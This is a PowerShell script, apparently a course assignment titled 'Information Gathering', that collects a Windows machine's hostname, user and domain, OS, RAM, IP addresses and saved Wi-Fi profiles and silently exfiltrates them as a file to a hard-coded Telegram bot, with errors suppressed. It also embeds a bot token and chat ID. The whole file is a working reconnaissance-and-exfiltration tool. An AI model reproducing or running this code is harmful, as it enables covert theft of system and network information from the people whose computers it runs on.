# ============================================================
#  W02a.2 - Information Gathering
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

function Send-TgMessage {
    param([string]$Text)
    try {
        for ($i = 0; $i -lt $Text.Length; $i += 4000) {
            $chunk = $Text.Substring($i, [Math]::Min(4000, $Text.Length - $i))
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
                -Method POST -Body @{ chat_id = $CHAT_ID; text = $chunk } | Out-Null
            if (($Text.Length - $i) -gt 4000) { Start-Sleep -Milliseconds 500 }
        }
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── Recon ────────────────────────────────────────────────────

Send-TgMessage "[INFO GATHERING] $env:COMPUTERNAME\$env:USERNAME gestartet"

# OS + RAM - prefer CimInstance, fall back to WmiObject
try   { $os  = (Get-CimInstance Win32_OperatingSystem).Caption }
catch { $os  = (Get-WmiObject   Win32_OperatingSystem).Caption }
try   { $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2) }
catch { $ram = [math]::Round((Get-WmiObject   Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2) }

# IPs - NetIPAddress module may not be loaded in hidden sessions
try {
    $ips = (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -notlike '127*' } |
            Select-Object -ExpandProperty IPAddress) -join ', '
} catch {
    $ips = (ipconfig 2>&1 |
            Select-String 'IPv4' |
            ForEach-Object { ($_.ToString() -split ':')[-1].Trim() }) -join ', '
}

$wifi = (netsh wlan show profiles 2>&1) -join "`n"

$report = @"
=== INFO GATHERING | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===
Hostname : $env:COMPUTERNAME
User     : $env:USERNAME ($env:USERDOMAIN)
OS       : $os ($env:PROCESSOR_ARCHITECTURE)
RAM (GB) : $ram
IP(s)    : $ips

=== WIFI PROFILES ===
$wifi
"@

Send-TgFile -Filename "info_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
            -Content $report `
            -Caption "Info Gathering - $env:COMPUTERNAME"
